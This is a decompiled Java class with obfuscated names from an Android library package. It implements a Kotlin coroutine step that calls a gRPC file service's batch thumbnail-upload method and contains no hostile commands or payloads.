package com.hawkshaw.library.datalayer.network.service;

import W2.y;
import Y1.C0110h;
import Y1.m0;
import a3.e;
import b3.C0298a;
import c3.C0331i;
import com.hawkshaw.library.FileServiceGrpcKt;
import i3.l;
import w3.C1066b;

public final class b extends C0331i implements l {

    /* renamed from: D  reason: collision with root package name */
    public int f4925D;

    /* renamed from: E  reason: collision with root package name */
    public final /* synthetic */ C1066b f4926E;

    /* JADX INFO: super call moved to the top of the method (can break code semantics) */
    public b(C1066b bVar, e eVar) {
        super(1, eVar);
        this.f4926E = bVar;
    }

    public final e create(e eVar) {
        return new b(this.f4926E, eVar);
    }

    public final Object invoke(Object obj) {
        return ((b) create((e) obj)).invokeSuspend(y.f2418a);
    }

    public final Object invokeSuspend(Object obj) {
        C0298a aVar = C0298a.f4140D;
        int i5 = this.f4925D;
        if (i5 == 0) {
            C0110h.P(obj);
            FileServiceGrpcKt.FileServiceCoroutineStub access$getFileService$p = FileServiceKt.fileService;
            this.f4925D = 1;
            obj = FileServiceGrpcKt.FileServiceCoroutineStub.batchThumbUpload$default(access$getFileService$p, this.f4926E, (m0) null, this, 2, (Object) null);
            if (obj == aVar) {
                return aVar;
            }
        } else if (i5 == 1) {
            C0110h.P(obj);
        } else {
            throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
        }
        return obj;
    }
}
